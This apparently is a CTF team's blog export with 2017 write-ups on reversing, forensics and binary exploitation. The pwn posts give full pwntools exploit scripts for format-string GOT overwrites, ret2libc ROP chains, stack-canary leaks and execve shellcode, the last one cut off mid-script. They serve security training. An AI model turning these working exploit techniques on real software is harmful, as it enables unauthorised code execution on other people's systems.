{"meta":{"title":"TEAMROCKETIST","subtitle":null,"description":"ctf team teamrocketist","author":"TEAMROCKETIST","url":"https://teamrocketist.github.io"},"pages":[{"title":"Competitions","date":"2017-10-05T02:48:49.500Z","updated":"2017-10-05T02:48:49.500Z","comments":true,"path":"competitions/index.html","permalink":"https://teamrocketist.github.io/competitions/index.html","excerpt":"","text":""},{"title":"Categories","date":"2017-08-10T02:13:29.387Z","updated":"2017-08-10T02:13:29.387Z","comments":false,"path":"categories/index.html","permalink":"https://teamrocketist.github.io/categories/index.html","excerpt":"","text":""},{"title":"About","date":"2017-08-11T14:07:21.419Z","updated":"2017-08-11T14:07:21.419Z","comments":false,"path":"about/index.html","permalink":"https://teamrocketist.github.io/about/index.html","excerpt":"","text":"123456789101112131415161718&#123; name: 'Ricardo Campos', profession: 'Student', education: 'Instituto Superior Técnico', Github: 'https://github.com/lolstorm92', skills: [ ['reverse'], ['pwning'], ['web'], ['crypto'], ['forensics'] ], description: 'Passionate about security mostly Web challenges and reverse engineering. Currently studies computer science at Instituto Superior Técnico'&#125;"},{"title":"Links","date":"2017-08-10T02:13:29.391Z","updated":"2017-08-10T02:13:29.391Z","comments":true,"path":"links/index.html","permalink":"https://teamrocketist.github.io/links/index.html","excerpt":"","text":""},{"title":"Tags","date":"2017-08-10T02:13:29.391Z","updated":"2017-08-10T02:13:29.391Z","comments":false,"path":"tags/index.html","permalink":"https://teamrocketist.github.io/tags/index.html","excerpt":"","text":""},{"title":"404 Not Found","date":"2017-08-10T13:22:50.269Z","updated":"2017-08-10T13:22:50.269Z","comments":false,"path":"/404.html","permalink":"https://teamrocketist.github.io//404.html","excerpt":"","text":""},{"title":"Repository","date":"2017-08-10T02:13:29.391Z","updated":"2017-08-10T02:13:29.391Z","comments":false,"path":"repository/index.html","permalink":"https://teamrocketist.github.io/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"[Reverse] BackdoorCTF 2017 - NO-CALM","slug":"Reverse-BackdoorCTF-2017-NO-CALM","date":"2017-09-26T11:09:07.000Z","updated":"2017-09-26T11:17:04.585Z","comments":true,"path":"2017/09/26/Reverse-BackdoorCTF-2017-NO-CALM/","link":"","permalink":"https://teamrocketist.github.io/2017/09/26/Reverse-BackdoorCTF-2017-NO-CALM/","excerpt":"","text":"Reverse challenge, using IDA to convert the binary into c pseudo code: We can see that the flag must be in the arguments of the flag, each byte of the flag will be an argv, the flag has 31 bytes as we can see in if check. Looking at the generated code we can see that each byte of the flag is being saved from the variable v6 to v35. After this we can see a bunch of if verifications:We can see it checks 3 bytes at time, with 3 different operation checks: 1(v7+v6-v8 == key[0] &amp;&amp; v6-v7+v8 == key[1] &amp;&amp; v7-v6+v8 == key[2]) == true And this repeats for all 3 bytes along the flag… it’s simple to write a python script to brute force the flag: 12345678910111213import stringa = string.printablekeys = [81,53,87,90,156,66,98,140,92,38,170,60,29,161,69,163,27,69,147,43,59,146,86,44,67,89,75,117,125,125]flags = []s = ''for i in range(0,len(keys),3): for b in a: for c in a: for d in a: if ord(c)+ord(b)-ord(d) == keys[i] and ord(b)-ord(c)+ord(d) == keys[i+1] and ord(c)-ord(b)+ord(d) == keys[i+2]: s += b+c+d print s Running it: 1234567891011$ python nocalm.py CTFCTF&#123;NoCTF&#123;Now_tCTF&#123;Now_th1sCTF&#123;Now_th1s_1sCTF&#123;Now_th1s_1s_t0CTF&#123;Now_th1s_1s_t0_g3CTF&#123;Now_th1s_1s_t0_g3t_ACTF&#123;Now_th1s_1s_t0_g3t_ANGRCTF&#123;Now_th1s_1s_t0_g3t_ANGRyy&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"backdoorctf","slug":"backdoorctf","permalink":"https://teamrocketist.github.io/tags/backdoorctf/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"}]},{"title":"[Pwn] BackdoorCTF 2017 - baby0x41414141","slug":"Pwn-BackdoorCTF-2017-baby0x41414141","date":"2017-09-25T04:46:07.000Z","updated":"2017-10-05T02:52:19.667Z","comments":true,"path":"2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/","link":"","permalink":"https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/","excerpt":"","text":"1.1 - format string vulnerability. We have a format string vulnerability we can confirm this by running the binary: 1234$ ./32_new Hello baby pwner, whats your name?%xOk cool, soon we will know whether you pwned it or not. Till then Bye 8048914 A there it is, we leaked an address from the stack, analysing the binary again we can see we already have a cool function that calls system(&#39;cat flag.txt&#39;) so we don’t have to actually leak libc addresses and go through all that trouble:1.2 - flag function. This one is really simple: 121 - Calculate the offset of the address we put in the stack using %p.2 - Modify the exit function address with flag function using %n. Before going into an explanation I’ll show you some modifiers from printf man page this will be useful since we want to override a certain number of bytes and this length modifiers will help us on that. 12345678910111213An optional length modifier, that specifies the size of the argument. The following length modifiers are valid for the d, i, n, o, u, x, or X conversion: Modifier d, i o, u, x, X n hh signed char unsigned char signed char * h short unsigned short short * l (ell) long unsigned long long * ll (ell ell) long long unsigned long long long long * j intmax_t uintmax_t intmax_t * t ptrdiff_t (see note) ptrdiff_t * z (see note) size_t (see note) q (deprecated) quad_t u_quad_t quad_t * For example if we want to override an address like this 0x0804870b this a 32 bit address so if we need to change all the bits we would use %ln which is a long and it’s 32 bits or we could even use %lln would work too since is 64 bit (long long). Usually we want to use %hn so we can override 2 bytes(16 bits) at each if we get greedy and try to override it as long when the binary prints the string output it will take a lot of time since it needs 0x0804870b spaces to be printed, this is why we prefer to use %hn the address but this time we need to do it in two operations instead of one. 120804 -&gt; '%11hn'870b -&gt; '%10hn' Stack address offset calculationWe can do this by printing a bunch of addresses from the stack using %x or %p, we can insert some ‘AAAA’ in the beginning and the a bunch of %x and check on which location the ‘AAAA’ are positioned in the stack. 123456def getConn(): return process('./32_new') if local else remote('163.172.176.29', 9035)r =getConn()r.recvuntil('Hello baby pwner, whats your name?\\n')s = 'AAAA'+ '%x,'*20r.sendline(s) We can see our 41414141 will appear in the position 10th, we now know where its located in the stack when we put some strings in the beginning: 12$ python 32_new.py Ok cool, soon we will know whether you pwned it or not. Till then Bye AAAA8048914,ff92ee98,1,f745c618,36e,f7462668,ff92f144,ff92eee4,ff92eee0,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825, To access its position we can do like this: 1'%10$hn' Override exit functionNow we need to calculate how much characters we need to add into our format expression, for example if we needed 100 we could do it like this: 1'%100%10$hn' Now starting the exploit we can easily get the exit GOT address with pwntools and the flag function we can get it from radare2 you can check it at the picture 1.2 above. One nice trick is to clear the existing EXIT function address with %10$lln of course since we are adding some characters at the begining of the string the address won’t be converted to 0 in this case it actually turned into 0x0000004e, 0x4e is 78 in decimal and that’s why I’m subtracting in the 78! And there is another thing that is very cleaver, is to split the address in half using some bit operations with this we know exactly how many characters to add (of course you still need to do some debugging in gdb). 12345678910EXIT_GOT = binary.got['exit']FLAG_LOW = FLAG &amp; 0xffffFLAG_HIGH = (FLAG &amp; 0xffff0000) &gt;&gt; 16s = p32(EXIT_GOT)s += p32(EXIT_GOT+2)s += '%10$lln' # clears the already existing exit addresss += '%&#123;&#125;x%11$hn'.format(FLAG_HIGH-78)s += '%&#123;&#125;x%10$hn'.format(FLAG_LOW-FLAG_HIGH) The full exploit: 1234567891011121314151617181920212223242526from pwn import *local = Falsedef getConn(): return process('./32_new') if local else remote('163.172.176.29', 9035)r =getConn()#gdb.attach(r, '''# b *0x08048724# c''')binary = ELF('./32_new')FLAG = 0x0804870bEXIT_GOT = binary.got['exit']FLAG_LOW = FLAG &amp; 0xffffFLAG_HIGH = (FLAG &amp; 0xffff0000) &gt;&gt; 16s = p32(EXIT_GOT)s += p32(EXIT_GOT+2)s += '%10$lln' # clears the already existing exit addresss += '%&#123;&#125;x%11$hn'.format(FLAG_HIGH-78)s += '%&#123;&#125;x%10$hn'.format(FLAG_LOW-FLAG_HIGH)r.recvuntil('Hello baby pwner, whats your name?\\n')r.sendline(s)print r.recvall(timeout=1)r.close()","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"}],"tags":[{"name":"formatstring","slug":"formatstring","permalink":"https://teamrocketist.github.io/tags/formatstring/"},{"name":"backdoorctf","slug":"backdoorctf","permalink":"https://teamrocketist.github.io/tags/backdoorctf/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"}]},{"title":"[Pwn] BackdoorCTF 2017 - Justdoit","slug":"Pwn-BackdoorCTF-2017-Justdoit","date":"2017-09-25T01:57:29.000Z","updated":"2017-09-25T04:54:39.302Z","comments":true,"path":"2017/09/25/Pwn-BackdoorCTF-2017-Justdoit/","link":"","permalink":"https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-Justdoit/","excerpt":"","text":"1.1 - representation of the assembly code of the binary So we have 32 bit binary and a buffer overflow vulnerability, lets use checksec to see its protections: 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) There isn’t a stack canary protection but we have NX ENABLED so we can’t execute code in the stack we have to use Return Oriented Programming(ROP) to leak libc addresses and finally return to libc… We can check which functions are available for us using objdump: 123456789101112$ objdump -R justdoit justdoit: file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE 08049ffc R_386_GLOB_DAT __gmon_start__0804a00c R_386_JUMP_SLOT read@GLIBC_2.00804a010 R_386_JUMP_SLOT printf@GLIBC_2.00804a014 R_386_JUMP_SLOT __gmon_start__0804a018 R_386_JUMP_SLOT __libc_start_main@GLIBC_2.00804a01c R_386_JUMP_SLOT write@GLIBC_2.0 We have write which is everything we need to do this challenge, using write we can leak addresses from the Global Offset Table (GOT) with the leaks we can calculate the offsets using the lib.so that was provided by the challenge. Here is the plan to exploit it: 1231 - Overflow the buffer2 - Using ROP to leak GOT addresses with write function and return to main3 - Overflow the buffer again and jump to system with /bin/sh as argument Overflow the bufferAccording to the assembly code at picture 1.1 the read function will read up to 200 bytes so lets use metasploit to create a 200 byte pattern: 12$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag Now lets see on each address it will break using gdb : 1234567pwndbg&gt; rStarting program: /home/evilgod/Documents/Hacking/ctf/backdoor/pwn/justdoit/justdoit Hello pwners, Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5AgProgram received signal SIGSEGV, Segmentation fault.Program received signal SIGSEGV (fault address 0x64413764) As we can see we have a page fault error at the address 0x64413764 so once again lets use metasploit to calculate the offset: 12$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x64413764[*] Exact match at offset 112 ROP and leak libc addresseswrite needs 3 arguments as follows: 1ssize_t write(int fildes, const void *buf, size_t nbytes); We can use pwntools to get the GOT and PLT addresses from the binary (note that you can use objdump too to achieve the same result). Memorize this if you are beginner in binary exploitation and don’t understand really well what GOT is, just remember if you want to jump and execute a function from libc you jump into PLT but if you want to leak an address from libc you get the value from the GOT address. 12345678from pwn import *binary = ELF('./justdoit')libc = ELF('libc.so.6')padding = 'A'*112WRITEPLT = binary.plt['write']PRINTFGOT = binary.got['printf']MAIN = 0x804847d # You can get this from radare2 for example Since the binary is 32 bits we don’t really need to pop stack address into specific registers like in 64 bit a simple ropchain to leak printf address can be built like this: 123456ropchain = ''ropchain += p32(WRITEPLT) # WRITE function \"call\"ropchain += p32(MAIN) # RETURN TO MAINropchain += p32(0x1) # STDIN ARG[0]ropchain += p32(PRINTFGOT) # PRINTF ADDRESS ARG[1]ropchain += p32(0x4) # BYTES TO READ ARG[2] After we send this to the server, we can calculate everything with symbols from pwntools : 123456789101112131415r = getConn()r.recvline()r.sendline(padding+ropchain)r.recv(len(padding)+len(ropchain)) # reads the printf outputPRINTF = u32(r.recv(0x4)) # leaked printf addressLIBCBASE = PRINTF - libc.symbols['printf']SYSTEM = LIBCBASE + libc.symbols['system']BINSH = LIBCBASE + 0x15900blog.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"PRINTF 0x%x\" % PRINTF)log.info(\"SYSTEM 0x%x\" % SYSTEM)log.info(\"Binsh 0x%x\" % BINSH) If you are wondering where I got the offset of /bin/sh string , you can use a nice trick with strings command: 12$ strings -a -t x libc.so.6 | grep '/bin/sh' 15900b /bin/sh Overflow again and jump to libcNow that we have system and /bin/sh string we can just jump into them! note that I had to readjust the padding offset (use gdb to check the values on the stack to calculate the offset): 123456789ropchain2 = p32(SYSTEM) # WRITE function \"call\"ropchain2 += 'BBBB' # Return address doesn't really matter to where we return after shellropchain2 += p32(BINSH)r.recvuntil('Hello pwners, \\n')r.sendline('A'*(112-8)+ropchain2)r.recv()r.interactive()r.close() And now the full script: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *local = Truedef getConn(): return process('./justdoit', env = &#123;\"LD_PRELOAD\":'./libc.so.6'&#125;) if local else remote('163.172.176.29', 9036)padding = 'A'*112binary = ELF('./justdoit')libc = ELF('libc.so.6')WRITEPLT = binary.plt['write']PRINTFGOT = binary.got['printf']MAIN = 0x804847d # You can get this from radare2 for exampleropchain = ''ropchain += p32(WRITEPLT) # PRINTF function \"call\"ropchain += p32(MAIN) # RETURN TO MAINropchain += p32(0x1) # STDIN ARG[0]ropchain += p32(PRINTFGOT) # PRINTF ADDRESS ARG[1]ropchain += p32(0x4) # BYTES TO READ ARG[2]r = getConn()#gdb.attach(r, '''# b *0x080484d8# c''')r.recvline()r.sendline(padding+ropchain)r.recv(len(padding)+len(ropchain)) # reads the printf outputPRINTF = u32(r.recv(0x4))LIBCBASE = PRINTF - libc.symbols['printf']SYSTEM = LIBCBASE + libc.symbols['system']BINSH = LIBCBASE + 0x15900blog.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"PRINTF 0x%x\" % PRINTF)log.info(\"SYSTEM 0x%x\" % SYSTEM)log.info(\"Binsh 0x%x\" % BINSH)ropchain2 = p32(SYSTEM) # WRITE function \"call\"ropchain2 += 'BBBB' # Return address doesn't really matter to where we return after shellropchain2 += p32(BINSH)r.recvuntil('Hello pwners, \\n')r.sendline('A'*(112-8)+ropchain2)r.recv()r.interactive()r.close()","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"}],"tags":[{"name":"backdoorctf","slug":"backdoorctf","permalink":"https://teamrocketist.github.io/tags/backdoorctf/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"bufferOverflow","slug":"bufferOverflow","permalink":"https://teamrocketist.github.io/tags/bufferOverflow/"},{"name":"ROP","slug":"ROP","permalink":"https://teamrocketist.github.io/tags/ROP/"},{"name":"retToLibc","slug":"retToLibc","permalink":"https://teamrocketist.github.io/tags/retToLibc/"}]},{"title":"[Forensics] CSAW - Best Router","slug":"Forensics-CSAW-Best-Router","date":"2017-09-19T09:34:16.000Z","updated":"2017-09-26T19:18:07.658Z","comments":true,"path":"2017/09/19/Forensics-CSAW-Best-Router/","link":"","permalink":"https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Best-Router/","excerpt":"","text":"Best Router http://forensics.chal.csaw.io:3287 NOTE: This will expand to ~16GB! 19:00 Eastern: updated. Old flags have been removed. Forensics challenge we have an img with 16GB, and an online service at http://forensics.chal.csaw.io:3287, the service asks for a username and a password so we guessed we need to find them in the img, so lets use autopsy to search in the linux filesystem for filenames that contain the word flag: As we can see we can found a /var/www/flag.txt unfortunately the file is empty, but we have the files of the web service of the link provided! Checking the username.txt and password.txt we can see that we have the username and password! After using the credentials on the web page we got the flag!","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"partitions","slug":"partitions","permalink":"https://teamrocketist.github.io/tags/partitions/"},{"name":"disk","slug":"disk","permalink":"https://teamrocketist.github.io/tags/disk/"},{"name":"autopsy","slug":"autopsy","permalink":"https://teamrocketist.github.io/tags/autopsy/"}]},{"title":"[Forensics] CSAW - Missed Registration","slug":"Forensics-CSAW-Missed-Registration","date":"2017-09-19T09:34:16.000Z","updated":"2017-09-19T10:49:04.383Z","comments":true,"path":"2017/09/19/Forensics-CSAW-Missed-Registration/","link":"","permalink":"https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Missed-Registration/","excerpt":"","text":"Missed RegistrationIt’s registration day! These forms just seem longer and longer…UPDATE 10:44 Eastern: New pcap that should be a bit easier to work with.UPDATE 2:58 Eastern: We’re regenerating due to flag leaks, submissions disabled until then. Please be patient.Update 3:31 Eastern: Updated pcap with new flag after leak. Please re-run your solutions on the file!https://ctf.csaw.io/files/bd2d3bcfdf09f06728d81d1a0cc0e4ff/cap.pcap We have a pcap file, at first we saw alot of HTTP POST requests: A lot of the form fields were filled with crap information in latin, at first we thought the parameter n was encrypted or some other kind of binary we extracted but we found nothing. After awhile instead of looking at HTTP form URL encoded tab from writeshark we started looking at TCP segment data and we found a new post param, a “x” parameter that only showed up in some of the requests: The very first HTTP POST requests has this value: 1&amp;x=424d923500000000000036040000280000004301000027000000010008000000000000000000c40e0000c40e00000001000000010000000001ff0c0e10ff0d1012ff131719ff161d21ff1b2226ff1c2b33ff1f313bff24292bff252c31ff2a3338ff33393bff243742ff283741ff the beginning of this value “424d” indicated us that this might be an bmp image file! so we extracted all x’s values in one line bash command!: 1tshark -r cap.pcap -Y \"http &amp;&amp; tcp.payload contains \\\"&amp;x=\\\"\" -Tfields -e tcp.segment_data | tr -d ':|\\n' | xxd -r -p | tr -d 'x=' | xxd -r -p &gt; img.bmp","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"pcap","slug":"pcap","permalink":"https://teamrocketist.github.io/tags/pcap/"},{"name":"bmp","slug":"bmp","permalink":"https://teamrocketist.github.io/tags/bmp/"}]},{"title":"[Pwn] CSAW - scv","slug":"Pwn-CSAW-scv","date":"2017-09-18T20:59:25.000Z","updated":"2017-09-27T13:27:21.911Z","comments":true,"path":"2017/09/18/Pwn-CSAW-scv/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-scv/","excerpt":"","text":"SCVSCV is too hungry to mine the minerals. Can you give him some food?nc pwn.chal.csaw.io 3764 IntroductionThe binary is pretty simple to read we have 3 options, option 1 is to feed the SCV which is just filling a buffer with string from stdin, option 2 prints the string using puts so no format string vulnerability possible here, option 3 is to exit the program. Pretty simple but where is the vulnerability? We can see the number of bytes in the parameters of read function is bigger than what the buffer can handle so we have a buffer overflow vulnerability but the real problem is how are we going to bypass this protections?: NX is enabled so the stack is not executable! we can bypass this easily using return-oriented-programming(ROP), butanother stack protection is enabled too which is the stack canary, we need to find away to leak addresses from the stack! but how do we do this? As we can see above the read function is reading the buf from STDIN, and what can we know about read? This function doesn’t put a null byte at the end of the read string, this awesome ! and why? because latter with option 2 puts will print the string until it finds a null byte, we can use this to our advantage to leak addresses from libc from the stack and even the stack canary itself! We just need to use gdb and look up the memory! The plan is pretty simple: 121 - Leak libc addresses and stack canary2 - Overflow the buffer and return to libc Leak libc addresses and stack canaryLets do some debugging with gdb lets buffer a break point right before the read occurs and check the values of the buffer before being filled: As we can see there is a libc address in stack 0x00007f2cea4aabe9 we so can count it easily how much we need to fill the buffer to print that address! and we need 40 bytes.Writing the code to do this is very simple can be built in a function like this: 12345678910111213141516171819202122232425def readAddressFromTheStack(size, bytes_to_read, offset=0): \"\"\" Args: size (int): number of characters to send to the stack. bytes_to_read (int): number of bytes to read from the stack we want to leak. offset (int): number to subtract if we want to adjust the leaked address. (Optional) Returns: int: returns an address leaked from the stack. \"\"\" # Write a certain number of bytes to leak an address r.recvuntil('&gt;&gt;') r.sendline('1') r.recvuntil('&gt;&gt;') r.sendline('A'*size) # Read it from the stack print r.recvuntil('&gt;&gt;') r.sendline('2') r.recvuntil('[*]PLEASE TREAT HIM WELL.....') r.recvline() r.recvline() r.recv(size) return u64(r.recv(bytes_to_read).ljust(8, '\\x00'))-offset So what to do with this address? we can calculate its offset to system for example! we can get the system address to calculate the offset and subtract the both values: Implementing this in python would be like this: 1234567891011# Get a libc address from the stackLEAKED = readAddressFromTheStack(40, 6, -0x8f)SYSTEM = LEAKED + 0xb0f7LIBCBASE = SYSTEM -libc.symbols['system']BINSH_OFFSET = 0x18cd17 # strings -a -t x libc-2.23.so | grep '/bin/sh'BINSH = LIBCBASE + BINSH_OFFSETlog.info(\"LEAKED LIBC 0x%x\" % LEAKED)log.info(\"SYSTEM LIBC 0x%x\" % SYSTEM)log.info(\"LIBCBASE LIBC 0x%x\" % LIBCBASE)log.info(\"BINSH ADDRESS 0x%x\" % BINSH) The 3rd argument of readAddressFromTheStack is adjusting the address because in the read we are reading 40 bytes plus the new line character ‘\\n’ because to send to the server we need to press enter, I could actually instead of sending 40 bytes in the padding we could just send 39 and the number would be right but I got lazy during the CTF so instead of fixing that I just adjust the address, the leaked address will always be overwritten with 0x0a which is ‘\\n’ Ascii code representation, so as I said before it needs some adjusting. Stack canaryNow that we have everything we need for libc we just need to get the stack canary address! to check where its being stored we can look at the very beginning of the main function From radare2 we can check it is being stored at local_8h which is a friendly name to be more readable in reality thinking it in assembly it’s stored in RBP-0x8 where RBP is the baseframe pointer. So lets check again in gdb, put a break point right before the read function and print the RBP-0x8 to see the stack canary value: Here is the code to get the stack canary from the stack: 123# leak STACK CANARYSTACK_CANARY = readAddressFromTheStack(40+8*16, 8, 0x0A)log.info(\"STACK CANARY 0x%x\" % STACK_CANARY) Overflow the buffer and return to libcWe already have everything we need we just need to jump to libc rewrite the stack canary where it should be and remember we can’t forget to choose option 3 to exit the program, otherwise we never execute the ret assembly instruction and jump to system(&quot;/bin/sh&quot;);: 1234567891011121314151617181920212223ROPCHAIN = ''ROPCHAIN += p64(POPRET)ROPCHAIN += p64(BINSH)ROPCHAIN += p64(SYSTEM)padding3 = 'A'*(40+8*16)+p64(STACK_CANARY)+ 'AAAAAAAA' + ROPCHAIN#rewrite old addressesr.recvuntil('&gt;&gt;')r.sendline('1')r.recvuntil('&gt;&gt;')r.sendline(padding3)# exitingprint r.recvuntil('&gt;&gt;')r.sendline('3')print r.recvuntil('[*]BYE ~ TIME TO MINE MIENRALS...')r.interactive()#time.sleep(10)r.close() The full exploit: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *import timedef getConn(): return process('./scv', env = &#123;\"LD_PRELOAD\":'./libc-2.23.so'&#125;) if local else remote('pwn.chal.csaw.io', 3764)def readAddressFromTheStack(size, bytes_to_read, offset=0): \"\"\" Args: size (int): number of characters to send to the stack. bytes_to_read (int): number of bytes to read from the stack we want to leak. offset (int): number to subtract if we want to adjust the leaked address. (Optional) Returns: int: returns an address leaked from the stack. \"\"\" # Write a certain number of bytes to leak LIBC r.recvuntil('&gt;&gt;') r.sendline('1') r.recvuntil('&gt;&gt;') r.sendline('A'*size) # Read from the stack print r.recvuntil('&gt;&gt;') r.sendline('2') r.recvuntil('[*]PLEASE TREAT HIM WELL.....') r.recvline() r.recvline() r.recv(size) return u64(r.recv(bytes_to_read).ljust(8, '\\x00'))-offset local = Falsebinary = ELF('./scv')libc = ELF('./libc-2.23.so')r = getConn()# b *0x00400aae#gdb.attach(r, '''#b *0x00400cce#b *0x00400cd3#b *0x00400ddf#b *0x00400d94#b *0x400d8f#b *0x00400dce#c''')# Get a libc address from the stackLEAKED = readAddressFromTheStack(40, 6, -0x8f)SYSTEM = LEAKED + 0xb0f7LIBCBASE = SYSTEM -libc.symbols['system']BINSH_OFFSET = 0x18cd17 # strings -a -t x libc-2.23.so | grep '/bin/sh'BINSH = LIBCBASE + BINSH_OFFSETPOPRET = 0x0000000000400ea3 # ROPgadget --binary ./scv --only \"pop|ret\"log.info(\"LEAKED LIBC 0x%x\" % LEAKED)log.info(\"SYSTEM LIBC 0x%x\" % SYSTEM)log.info(\"LIBCBASE LIBC 0x%x\" % LIBCBASE)log.info(\"BINSH ADDRESS 0x%x\" % BINSH)r.recv(1) # new line# leak STACK CANARYSTACK_CANARY = readAddressFromTheStack(40+8*16, 8, 0x0A)log.info(\"STACK CANARY 0x%x\" % STACK_CANARY)ROPCHAIN = ''ROPCHAIN += p64(POPRET)ROPCHAIN += p64(BINSH)ROPCHAIN += p64(SYSTEM)padding3 = 'A'*(40+8*16)+p64(STACK_CANARY)+ 'AAAAAAAA' + ROPCHAIN#rewrite old addressesr.recvuntil('&gt;&gt;')r.sendline('1')r.recvuntil('&gt;&gt;')r.sendline(padding3)# exitingprint r.recvuntil('&gt;&gt;')r.sendline('3')print r.recvuntil('[*]BYE ~ TIME TO MINE MIENRALS...')r.interactive()r.close() Running it and get the flag: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051$ python scv.py[*] '~/ctf/csaw/pwn/scv/scv' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)[*] '~/ctf/csaw/pwn/scv/libc-2.23.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to pwn.chal.csaw.io on port 3764: Done-------------------------[*]SCV GOOD TO GO,SIR....-------------------------1.FEED SCV....2.REVIEW THE FOOD....3.MINE MINERALS....-------------------------&gt;&gt;[*] LEAKED LIBC 0x7fe343297299[*] SYSTEM LIBC 0x7fe3432a2390[*] LIBCBASE LIBC 0x7fe34325d000[*] BINSH ADDRESS 0x7fe3433e9d17-------------------------[*]SCV GOOD TO GO,SIR....-------------------------1.FEED SCV....2.REVIEW THE FOOD....3.MINE MINERALS....-------------------------&gt;&gt;[*] STACK CANARY 0x49b1940e5e5ffe00-------------------------[*]SCV GOOD TO GO,SIR....-------------------------1.FEED SCV....2.REVIEW THE FOOD....3.MINE MINERALS....-------------------------&gt;&gt;[*]BYE ~ TIME TO MINE MIENRALS...[*] Switching to interactive mode$ lsflagscv$ cat flagflag&#123;sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"stackcanary","slug":"stackcanary","permalink":"https://teamrocketist.github.io/tags/stackcanary/"},{"name":"bufferOverflow","slug":"bufferOverflow","permalink":"https://teamrocketist.github.io/tags/bufferOverflow/"}]},{"title":"[Pwn] CSAW - Pilot","slug":"Pwn-CSAW-Pilot","date":"2017-09-18T20:58:25.000Z","updated":"2017-09-27T12:13:57.347Z","comments":true,"path":"2017/09/18/Pwn-CSAW-Pilot/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/","excerpt":"","text":"pilotCan I take your order?nc pwn.chal.csaw.io 846416:05 Eastern: Updated binary Simple bufferoverflow , we actually have a read size of 0x40 stack the binary doesn’t have any kind of protections so it’s a very easy one, just a simple buffer overflow, we even get the buffer address to jump! The plan is: 12341 - Caculate the offset to overflow.2 - Extract the address of the buffer.3 - Insert nops at the beginning and then shell code, the rest of the buffer fill it with A or any other values4 - Modify the return address with the value of the beginning of the buffer Visual representation of the stack! How the stack looks like in gdb! 1234pwndbg&gt; x/20g 0x7ffef19136600x7ffef1913660: 0xbf48f63190909090 0xff978cd091969dd1 0x7ffef1913670: 0x573b04e6f7dff748 0x41414141050f5f54 0x7ffef1913680: 0x4141414141414141 0x00007ffef1913660 The offset is 40 bytes to overflow the code is very simple 123456789101112131415161718192021222324252627from pwn import *def getConn(): return process('pwn/pilot') if local else remote('pwn.chal.csaw.io', 8464) binary = ELF('pwn/pilot')local = Falser = getConn()#db.attach(r, '''#break *0x0000000000400b35#c''')r.recvuntil('[*]Good Luck Pilot!....\\n')nops = '\\x90'*4shellcode = \"\\x31\\xf6\\x48\\xbf\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdf\\xf7\\xe6\\x04\\x3b\\x57\\x54\\x5f\\x0f\\x05\"padding = 'A'* (40 - len(nops)- len(shellcode)) BUFFER = int(r.recvline()[12:],0)log.info(\"LEAKED BUFFER 0x%x\" % 